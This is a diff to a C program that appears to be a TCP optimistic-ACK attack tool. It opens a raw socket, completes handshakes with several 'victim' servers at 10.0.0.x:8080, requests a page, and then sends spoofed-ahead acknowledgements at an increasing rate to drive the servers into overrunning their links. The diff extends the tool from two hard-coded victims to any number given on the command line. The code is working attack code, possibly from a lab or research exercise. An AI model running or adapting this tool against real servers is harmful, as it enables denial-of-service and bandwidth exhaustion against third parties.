@@ -50,11 +50,12 @@ struct victim_connection {
 
 struct pace_args {
   int socket;
-  //struct victim_connection *m_victim;
-	unsigned victims;
+  unsigned num_victims;
   int duration;
-	struct victim_connection m_victims[];
+  struct victim_connection *m_victims;
 };
+
+void processOverruns(unsigned seq, struct victim_connection *m_victim);
 
 double d_max(double a, double b) {
     if (a > b)
@@ -237,16 +238,20 @@ int send_packet(int socket,
 
 }
 unsigned getIndex(u_int32_t ip) {
-	unsigned index;
-	index = ip>>24;
-	return index;
+  unsigned index;
+  index = ip>>24;
+  return index;
 }
 /* TODO This will take 3 arguments. The list of all the connections
  * the socket, and the victim to return on.
  * If any packets arrive that do not belong to the current host,
  * it will check for an overrun
  */
-unsigned read_packet(struct victim_connection *m_victim, int sock, struct victim_connection m_victims[], unsigned victims) {
+unsigned read_packet(struct victim_connection *m_victim,
+                     int sock,
+                     struct victim_connection *m_victims,
+                     unsigned num_victims) {
+
     // TODO keep reading the socket for a relevent ip
     // update the sequence number
 
@@ -255,6 +260,7 @@ unsigned read_packet(struct victim_connection *m_victim, int sock, struct victim
       if (recvfrom(sock, buff, 65535, 0, NULL, NULL) < 0) {
         perror("Error on recv()");
       } else {
+        // find out who sent this packet
         struct sockaddr_in source_socket_address, dest_socket_address;
         struct iphdr *ip_packet = (struct iphdr *) buff;
         memset(&source_socket_address, 0, sizeof(source_socket_address));
@@ -274,30 +280,35 @@ unsigned read_packet(struct victim_connection *m_victim, int sock, struct victim
           //printf("Source Address: %s\n", (char *)inet_ntoa(source_socket_address.sin_addr));
           //printf("Destination Address: %s\n", (char *)inet_ntoa(dest_socket_address.sin_addr));
           //printf("Identification: %d\n\n", ntohs(ip_packet->id));
+
+
+          // Return the sequence number for the received packet
           return ntohl(tcph->seq);
         } else {
           //printf("Does not match\n");
-					int i;
-					for(i=0; i<victims; i++)
-					{
-						if(source_socket_address.sin_addr.s_addr == m_victims[i].dst_addr)
-						{
-							unsigned short iphdrlen;
-          		iphdrlen = ip_packet->ihl*4;
-	
-	          	struct tcphdr *tcph = (struct tcphdr*)(buff + iphdrlen);
-					
-							processOverruns(ntohl(tcph->seq), m_victims[i]);
-						}
-					}
+          int i = getIndex(source_socket_address.sin_addr.s_addr) - 2;
+          if (i >= 0 && i < num_victims) {
+            if(source_socket_address.sin_addr.s_addr == m_victims[i].dst_addr) {
+              unsigned short iphdrlen;
+              iphdrlen = ip_packet->ihl*4;
+
+              struct tcphdr *tcph = (struct tcphdr*)(buff + iphdrlen);
+
+              processOverruns(ntohl(tcph->seq), &(m_victims[i]));
+            }
+          }
         }
       }
     }
 
 }
 
-void handshake(struct victim_connection *m_victim, int sock, struct victim_connection m_victims[], unsigned victims) {
-	unsigned send_seq = 256; //TODO random
+void handshake(struct victim_connection *m_victim,
+               int sock,
+               struct victim_connection *m_victims,
+               unsigned victims) {
+
+    unsigned send_seq = 256; //TODO random
     long ack_nbr=-1;
     void* content = "";
     unsigned content_length = 0;
@@ -306,73 +317,76 @@ void handshake(struct victim_connection *m_victim, int sock, struct victim_conne
     char rst = 0;
     unsigned short window = 5840;
     int w_scale = 0;
-	send_packet(sock,m_victim,send_seq,ack_nbr,
-				content,content_length,1,fin,rst,0,
-				MSS,w_scale);
-	unsigned read_seq = read_packet(m_victim, sock, m_victims, victims);
+    send_packet(sock,m_victim,send_seq,ack_nbr,
+                content,content_length,1,fin,rst,0,
+                MSS,w_scale);
+    unsigned read_seq = read_packet(m_victim, sock, m_victims, victims);
   //printf("Received packet with sequence num: %u\n", read_seq);
-  send_seq +=1;
-  ack_nbr = 0;
-	ack_nbr = (long)read_seq+1;
-  //printf("Handshake ack_nbr: %u, %ld, %ld",read_seq, ack_nbr, (long) read_seq + 1);
-	send_packet(sock,m_victim,send_seq,ack_nbr,
-				content,content_length,syn,fin,rst,1,
-				window,w_scale);
-	content="GET / HTTP/1.0\r\n\r\n";
-  content_length = strlen(content);
-	send_packet(sock,m_victim,send_seq,ack_nbr,
-				content,content_length,syn,fin,rst,1,
-				window,w_scale);
-	m_victim->send_seq = send_seq + content_length;
+    send_seq +=1;
+    ack_nbr = 0;
+    ack_nbr = (long)read_seq+1;
+    send_packet(sock,m_victim,send_seq,ack_nbr,
+                content,content_length,syn,fin,rst,1,
+                window,w_scale);
+    content = "GET / HTTP/1.0\r\n\r\n";
+    content_length = strlen(content);
+    send_packet(sock,m_victim,send_seq,ack_nbr,
+    content,content_length,syn,fin,rst,1,
+    window,w_scale);
+    m_victim->send_seq = send_seq + content_length;
 
 }
 void processOverruns(unsigned seq, struct victim_connection *m_victim)
 {
-	printf("Received packet in check overruns\n");
+  printf("Received packet in check overruns\n");
   pthread_mutex_lock(&(m_victim->lock));
   if (seq == m_victim->last_received_seq) {
-  	printf("This is an overrun\n");
-  	m_victim->had_overrun = 1;
-  	m_victim->overrun_ack = seq;
+    printf("This is an overrun\n");
+    m_victim->had_overrun = 1;
+    m_victim->overrun_ack = seq;
   } else if (seq > m_victim->last_received_seq) {
-  	printf("There is no overrun\n");
- 		m_victim->last_received_seq = seq;
+    printf("There is no overrun\n");
+    m_victim->last_received_seq = seq;
   }
   pthread_mutex_unlock(&(m_victim->lock));
 }
+
 /**
  *  This method is used by the listening thread to receive packets
  */
 void *checkOverruns(void *vargp) {
 
     struct pace_args *m_args = (struct pace_args*) vargp;
-		int i;
-		for(i=0; i<m_args->victims; i++)
-		{
-    	struct timeval start_time, current_time;
-    	gettimeofday(&start_time, NULL);
-    	gettimeofday(&current_time, NULL);
+    int i;
+    struct timeval start_time, current_time;
+    gettimeofday(&start_time, NULL);
+    gettimeofday(&current_time, NULL);
 
-	    while (current_time.tv_sec - start_time.tv_sec <= m_args->duration) {
+    while (current_time.tv_sec - start_time.tv_sec <= m_args->duration) {
 
-	      unsigned read_seq = read_packet(&(m_args->m_victims[i]), m_args->socket, m_args->m_victims, m_args->victims);
-      	processOverruns(read_seq, &(m_args->m_victims[i]));
+      for (i = 0; i < m_args->num_victims; i++) {
 
-      	gettimeofday(&current_time, NULL);
-    	}
-		}
+        unsigned read_seq = read_packet(&(m_args->m_victims[i]),
+                                          m_args->socket,
+                                          m_args->m_victims,
+                                          m_args->num_victims);
+
+        processOverruns(read_seq, &(m_args->m_victims[i]));
+
+      }
+
+      gettimeofday(&current_time, NULL);
+
+    }
 }
 
-int beginAttack(int duration, double target_rate) {
+int beginAttack(int duration, double target_rate, int num_victims) {
 
     // local variables
     int sock, i;
-		unsigned victims = 2;
-    struct victim_connection m_victims[victims];
-    double curr_rate = target_rate / 10;
-
     // TODO Implement
-    int nbr_connections = 1;
+    struct victim_connection m_victims[num_victims];
+    double curr_rate = target_rate / 10;
 
     // Open the socket
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
@@ -380,55 +394,55 @@ int beginAttack(int duration, double target_rate) {
       exit(-1);
     }
 
-		// Set up each connection struct
-		for(i=0; i<victims; i++){
-			struct victim_connection m_victim;
-    	m_victim.id = 2;
-    	m_victim.dst_addr = inet_addr("10.0.0.2");
-    	m_victim.dst_port = 8080;//TODO;
-    	m_victim.window = MSS;
-    	m_victim.had_overrun = 0;
-    	m_victim.overrun_ack = 0;
-    	m_victim.is_done = 0;
-			if (pthread_mutex_init(&(m_victim.lock), NULL) != 0) {
+    // Set up each connection struct
+    for(i = 0; i < num_victims; i++) {
+      struct victim_connection m_victim;
+      char victAddr[20];
+      sprintf(victAddr, "10.0.0.%d", i + 2);
+
+      m_victim.id = i + 2;
+      m_victim.dst_addr = inet_addr(victAddr);
+      m_victim.dst_port = 8080;//TODO;
+      m_victim.window = MSS;
+      m_victim.had_overrun = 0;
+      m_victim.overrun_ack = 0;
+      m_victim.is_done = 0;
+      if (pthread_mutex_init(&(m_victim.lock), NULL) != 0) {
         printf("\nFailed to create mutex lock");
         return 1;
-    	}
-			m_victims[i]=m_victim;
-		}
+      }
+      m_victims[i] = m_victim;
+    }
 
     // TODO FOR MULTI CONNECTION DO THE NEXT 3 LINES TOGETHER FOR EACH
     // VICTIM
     // Connect to each server using 3-way handshake
-		for(i=0; i<victims; i++){
-    	handshake(&m_victims[i], sock, m_victims, victims);
-      // Get the start ack for each connection
-      unsigned read_seq = read_packet(&m_victims[i], sock, m_victims, victims);
-      m_victims[i].start_ack = m_victims[i].last_received_seq = m_victims[i].last_sent_ack = read_seq;
-		}
+    for(i = 0; i < num_victims; i++){
+
+        handshake(&m_victims[i], sock, m_victims, num_victims);
+        // Get the start ack for each connection
+        unsigned read_seq = read_packet(&(m_victims[i]),
+                                        sock,
+                                        m_victims,
+                                        num_victims);
 
 
-
-    // Begin the pace thread to observe overruns
-    // TODO
+        m_victims[i]    .start_ack
+          = m_victims[i].last_received_seq
+          = m_victims[i].last_sent_ack
+          = read_seq;
+    }
 
     pthread_t tid;
     struct pace_args p_args;
     p_args.socket = sock;
-    //p_args.m_victim = &m_victim;
-		p_args.victims = victims;
+    p_args.num_victims = num_victims;
     p_args.duration = duration;
-		for(i=0; i<victims; i++)
-		{
-			p_args.m_victims[i] = m_victims[i];
-		}
+    p_args.m_victims = m_victims;
 
     pthread_create(&tid, NULL, checkOverruns, (void *) &p_args);
 
     // begin the real attack
-		for(i=0; i<victims; i++)
-		{
-		struct victim_connection m_victim = m_victims[i];
 
     struct timeval start_time, current_time;
     gettimeofday(&start_time, NULL);
@@ -437,57 +451,60 @@ int beginAttack(int duration, double target_rate) {
     while (current_time.tv_sec - start_time.tv_sec <= duration) {
       // See if the attack should stop
 
-      pthread_mutex_lock(&(m_victim.lock));
-      if (m_victim.had_overrun) {
-        printf("Resetting last sent ack\n");
-        m_victim.last_sent_ack = m_victim.overrun_ack;
-        m_victim.had_overrun = 0;
-      }
-      pthread_mutex_unlock(&(m_victim.lock));
+      for (i = 0; i < num_victims; i++) {
+        struct victim_connection *currConnection = &(m_victims[i]);
+        pthread_mutex_lock(&(currConnection->lock));
+        if (currConnection->had_overrun) {
+          printf("Resetting last sent ack\n");
+          currConnection->last_sent_ack = currConnection->overrun_ack;
+          currConnection->had_overrun = 0;
+        }
+        pthread_mutex_unlock(&(currConnection->lock));
 
-      struct timeval before_sent, after_sent;
-      gettimeofday(&before_sent, NULL);
+        struct timeval before_sent, after_sent;
+        gettimeofday(&before_sent, NULL);
 
-      // Go through each connection and send the next ack
+        // Go through each connection and send the next ack
 
-      send_packet(sock,                       // socket
-                  &m_victim,                  // connection
-                  m_victim.send_seq,          // sequence number
-                  m_victim.last_sent_ack,     // ack number
-                  "",                         // content
-                  0,                          // content length
-                  0,                          // syn
-                  0,                          // fin
-                  0,                          // rst
-                  1,                          // is_ack
-                  5840,                       // window
-                  0);                         // w_scale
+        send_packet(sock,                       // socket
+                    currConnection,             // connection
+                    currConnection->send_seq,          // sequence number
+                    currConnection->last_sent_ack,     // ack number
+                    "",                         // content
+                    0,                          // content length
+                    0,                          // syn
+                    0,                          // fin
+                    0,                          // rst
+                    1,                          // is_ack
+                    5840,                       // window
+                    0);                         // w_scale
 
-      gettimeofday(&after_sent, NULL);
+        gettimeofday(&after_sent, NULL);
 
-      // for each connection increment the ack by the window size
-      m_victim.last_sent_ack += m_victim.window;
+        // for each connection increment the ack by the window size
+        currConnection->last_sent_ack += currConnection->window;
 
-      // TODO go to sleep for the right amount of time
-      double elapsed_seconds = (after_sent.tv_sec - before_sent.tv_sec) +
-                        1.0e-6 * (after_sent.tv_usec - before_sent.tv_usec);
+        // TODO go to sleep for the right amount of time
+        double elapsed_seconds = (after_sent.tv_sec - before_sent.tv_sec) +
+                          1.0e-6 * (after_sent.tv_usec - before_sent.tv_usec);
 
-      double secsToWait = d_max(min_wait,
-                          m_victim.window / (curr_rate * nbr_connections));
+        double secsToWait = d_max(min_wait,
+                            currConnection->window / (curr_rate * num_victims));
 
-      secsToWait -= elapsed_seconds;
+        secsToWait -= elapsed_seconds;
 
-      if (secsToWait > 0) {
-          struct timespec rgtp;
-          double nanoToWait = secsToWait * 1E9;
-          rgtp.tv_sec = 0;
-          rgtp.tv_nsec = nanoToWait;
-          nanosleep(&rgtp, NULL);
-      }
+        if (secsToWait > 0) {
+            struct timespec rgtp;
+            double nanoToWait = secsToWait * 1E9;
+            rgtp.tv_sec = 0;
+            rgtp.tv_nsec = nanoToWait;
+            nanosleep(&rgtp, NULL);
+        }
 
-      // increase the window size by mss as long as its less than the max
-      if (m_victim.window < maxwindow) {
-          m_victim.window += MSS;
+        // increase the window size by mss as long as its less than the max
+        if (currConnection->window < maxwindow) {
+            currConnection->window += MSS;
+        }
       }
 
       if (curr_rate < target_rate) {
@@ -496,24 +513,32 @@ int beginAttack(int duration, double target_rate) {
 
       gettimeofday(&current_time, NULL);
     }
+
+
     // Cleanup send the fin packet since we cannot call RST
+    // TODO THIS PROBABLY ISN'T NEEDED
+    for (i = 0; i < num_victims; i++) {
 
-    send_packet(sock,                         // socket
-                &m_victim,                    // connection
-                m_victim.send_seq,            // sequence number
-                0,                            // ack number
-                "",                           // content
-                0,                            // content length
-                0,                            // syn
-                1,                            // fin
-                0,                            // rst
-                0,                            // is_ack
-                5840,                         // window
-                0);                           // w_scale
+      send_packet(sock,                         // socket
+                  &m_victims[i],                    // connection
+                  m_victims[i].send_seq,            // sequence number
+                  0,                            // ack number
+                  "",                           // content
+                  0,                            // content length
+                  0,                            // syn
+                  1,                            // fin
+                  0,                            // rst
+                  0,                            // is_ack
+                  5840,                         // window
+                  0);                           // w_scale
 
+    }
     pthread_join(tid, NULL);
-    pthread_mutex_destroy(&(m_victim.lock));
-		}
+
+    for (i = 0; i < num_victims; i++ ) {
+      pthread_mutex_destroy(&(m_victims[i].lock));
+    }
+
     close(sock);
 }
 
@@ -522,7 +547,10 @@ int beginAttack(int duration, double target_rate) {
 int main(int argc, char const *argv[]) {
   printf("In Main: About to begin:");
   // TODO, more arguments will be provided as the ip and ports of victims
-  beginAttack(30, 11250000.0);
+
+  int num_victims = atoi(argv[1]);
+
+  beginAttack(30, 11250000.0, num_victims);
 
   return 0;
 }
